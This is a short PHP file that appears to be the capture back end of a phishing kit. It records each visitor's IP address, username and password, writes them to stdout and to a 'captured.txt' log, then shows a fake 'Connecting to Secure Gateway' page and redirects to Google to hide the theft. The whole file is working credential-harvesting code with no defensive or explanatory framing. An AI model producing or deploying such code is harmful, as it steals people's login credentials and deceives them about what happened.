<?php
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
$user = $_POST['username'] ?? 'N/A';
$pass = $_POST['password'] ?? 'N/A';

$log = "[📡 CAPTURED] $time | IP: $ip | User: $user | Pass: $pass\n";
file_put_contents('php://stdout', $log);
file_put_contents('../../logs/captured.txt', $log, FILE_APPEND);

echo '<!DOCTYPE html>
<html>
<head><title>Redirecting...</title>
<style>body{background:#0f0c29;color:white;text-align:center;padding-top:150px;font-family:sans-serif;}.loader{border:5px solid #333;border-top:5px solid #00d4ff;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
</head>
<body>
<h2>🔄 Connecting to Secure Gateway...</h2>
<div class="loader"></div>
<p>Please wait, validating credentials...</p>
<meta http-equiv="refresh" content="3;url=https://www.google.com">
</body>
</html>';
?>
